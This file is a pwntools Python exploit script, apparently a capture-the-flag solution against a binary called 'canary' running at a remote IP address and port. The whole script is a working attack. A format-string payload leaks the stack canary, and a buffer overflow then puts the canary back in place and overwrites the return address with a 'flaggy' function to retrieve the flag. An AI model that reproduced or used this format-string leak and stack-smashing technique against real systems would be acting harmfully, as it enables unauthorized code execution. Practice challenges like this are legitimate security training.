from pwn import *

BIN = './canary'
# p = process(BIN)
p = remote('141.85.224.106', 31342)
elf = ELF(BIN)

buff_len = 0x20 - 8
p.recvuntil(b'[y/n]\n')
payload1 = b'y' + b'%9$lx'
p.sendline(payload1)

canary_str = p.recvline().rstrip()
canary_str = canary_str[canary_str.find(b'y')+1:].decode()
canary = bytearray.fromhex(canary_str)
canary.reverse()

p.recvuntil(b'[y/n]\n')
payload2 = b'y' * buff_len + canary + b'a' * 8 + p64(elf.symbols['flaggy'])
p.sendline(payload2)

p.recvuntil(b'[y/n]\n')
p.sendline(b'n')

p.recvuntil(b'flag\n')
print(p.recvline().rstrip().decode())
